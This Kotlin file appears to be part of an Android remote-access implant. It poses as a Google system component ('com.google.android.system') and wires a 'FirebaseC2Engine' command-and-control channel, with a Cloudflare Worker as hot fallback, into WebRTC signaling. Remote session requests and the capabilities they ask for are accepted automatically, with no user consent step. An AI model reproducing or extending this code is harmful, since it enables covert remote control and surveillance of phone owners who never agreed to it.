package com.google.android.system

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicLong

/**
 * SignalingCoordinator
 *
 * Coordinates WebRTC signaling over dual redundant paths:
 * 1. Firebase Realtime Database (Primary)
 * 2. Cloudflare Worker Durable Object WebSocket (Hot Fallback)
 *
 * Deduplicates messages by messageId, handles sequence counters, and coordinates failover.
 */
class SignalingCoordinator(
    private val context: Context,
    private val firebaseEngine: FirebaseC2Engine
) {
    companion object {
        private const val TAG = "SignalingCoordinator"
    }

    interface Listener {
        fun onSessionRequested(sessionId: String, requestedCapabilities: List<String>)
        fun onOfferReceived(sessionId: String, sdp: String)
        fun onIceCandidateReceived(sessionId: String, candidateJson: JSONObject)
        fun onSessionClosed(sessionId: String)
    }

    private val firebaseProvider = FirebaseSignalingProvider(context, firebaseEngine)
    private val cloudflareProvider = CloudflareSignalingProvider(context, firebaseEngine)
    private val messageTracker = ProcessedMessageTracker()
    private val sequenceCounter = AtomicLong(0L)

    private var listener: Listener? = null
    private var scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var activeSessionId: String? = null

    fun setListener(listener: Listener?) {
        this.listener = listener
    }

    fun start() {
        Log.i(TAG, "Starting Dual-Path Signaling Coordinator 🚀")

        val envelopeHandler = object : FirebaseSignalingProvider.Listener, CloudflareSignalingProvider.Listener {
            override fun onEnvelopeReceived(envelope: SignalingEnvelope) {
                handleIncomingEnvelope(envelope)
            }

            override fun onConnected() {
                Log.i(TAG, "Cloudflare hot fallback path ACTIVE 🟢")
            }

            override fun onDisconnected() {
                Log.w(TAG, "Cloudflare hot fallback path disconnected (retrying)")
            }
        }

        firebaseProvider.setListener(envelopeHandler)
        cloudflareProvider.setListener(envelopeHandler)

        firebaseProvider.startListening(scope)
        cloudflareProvider.start(scope)
    }

    fun stop() {
        try {
            firebaseProvider.stopListening()
            cloudflareProvider.stop()
            scope.cancel()
            messageTracker.clear()
            activeSessionId = null
            Log.i(TAG, "Signaling Coordinator Stopped.")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping SignalingCoordinator: ${e.message}")
        }
    }

    @Synchronized
    private fun handleIncomingEnvelope(envelope: SignalingEnvelope) {
        if (envelope.senderRole == "ANDROID") {
            // Ignore self-published messages
            return
        }

        if (messageTracker.isAlreadyProcessed(envelope.sessionId, envelope.messageId)) {
            // Deduplicate second copy arriving via fallback route
            return
        }

        Log.i(TAG, "Received Signaling Envelope: type=${envelope.type}, sessionId=${envelope.sessionId}, messageId=${envelope.messageId}")

        when (envelope.type) {
            "SESSION_REQUEST" -> {
                if (activeSessionId == null || activeSessionId != envelope.sessionId) {
                    if (activeSessionId != null && activeSessionId != envelope.sessionId) {
                        listener?.onSessionClosed(activeSessionId!!)
                    }
                    activeSessionId = envelope.sessionId
                    postSessionAccepted(envelope.sessionId)
                    val reqCaps = mutableListOf<String>()
                    val capsArr = envelope.payload.optJSONArray("requestedCapabilities")
                    if (capsArr != null) {
                        for (i in 0 until capsArr.length()) reqCaps.add(capsArr.getString(i))
                    }
                    listener?.onSessionRequested(envelope.sessionId, reqCaps)
                }
            }
            "SDP_OFFER" -> {
                val sdp = envelope.payload.optString("sdp", "")
                if (sdp.isNotBlank()) {
                    if (activeSessionId == null) activeSessionId = envelope.sessionId
                    listener?.onOfferReceived(envelope.sessionId, sdp)
                }
            }
            "ICE_CANDIDATE" -> {
                val candStr = envelope.payload.optString("candidate", "")
                if (candStr.isNotBlank()) {
                    listener?.onIceCandidateReceived(envelope.sessionId, envelope.payload)
                }
            }
            "SESSION_CLOSE", "SESSION_ERROR" -> {
                val sessId = activeSessionId ?: envelope.sessionId
                activeSessionId = null
                listener?.onSessionClosed(sessId)
            }
        }
    }

    fun postSessionAccepted(sessionId: String) {
        val envelope = SignalingEnvelope(
            protocolVersion = 1,
            sessionId = sessionId,
            messageId = "acc_${sessionId}_${System.currentTimeMillis()}",
            sequence = sequenceCounter.incrementAndGet(),
            senderRole = "ANDROID",
            type = "SESSION_ACCEPTED",
            payload = JSONObject().apply { put("status", "ACCEPTED") }
        )
        publishDual(envelope)
    }

    fun postSdpAnswer(sessionId: String, sdp: String) {
        val envelope = SignalingEnvelope(
            protocolVersion = 1,
            sessionId = sessionId,
            messageId = "ans_${sessionId}_${System.currentTimeMillis()}",
            sequence = sequenceCounter.incrementAndGet(),
            senderRole = "ANDROID",
            type = "SDP_ANSWER",
            payload = JSONObject().apply {
                put("type", "answer")
                put("sdp", sdp)
                put("revision", 1)
            }
        )
        publishDual(envelope)
    }

    fun postIceCandidate(sessionId: String, candidate: String, sdpMid: String, sdpMLineIndex: Int) {
        val envelope = SignalingEnvelope(
            protocolVersion = 1,
            sessionId = sessionId,
            messageId = "cand_${sessionId}_${System.currentTimeMillis()}_${(0..999).random()}",
            sequence = sequenceCounter.incrementAndGet(),
            senderRole = "ANDROID",
            type = "ICE_CANDIDATE",
            payload = JSONObject().apply {
                put("senderRole", "ANDROID")
                put("sender", "ANDROID")
                put("candidate", candidate)
                put("sdpMid", sdpMid)
                put("sdpMLineIndex", sdpMLineIndex)
            }
        )
        publishDual(envelope)
    }

    fun postSessionClosed(sessionId: String) {
        val envelope = SignalingEnvelope(
            protocolVersion = 1,
            sessionId = sessionId,
            messageId = "close_${sessionId}_${System.currentTimeMillis()}",
            sequence = sequenceCounter.incrementAndGet(),
            senderRole = "ANDROID",
            type = "SESSION_CLOSE",
            payload = JSONObject().apply { put("status", "CLOSED") }
        )
        publishDual(envelope)
    }

    private fun publishDual(envelope: SignalingEnvelope) {
        scope.launch(Dispatchers.IO) {
            val fbJob = async { firebaseProvider.publishEnvelope(envelope) }
            val cfJob = async { cloudflareProvider.publishEnvelope(envelope) }

            val fbResult = fbJob.await()
            val cfResult = cfJob.await()

            Log.i(TAG, "Dual-Publish Envelope (${envelope.type}, ID: ${envelope.messageId}): Firebase=$fbResult, Cloudflare=$cfResult")
        }
    }
}
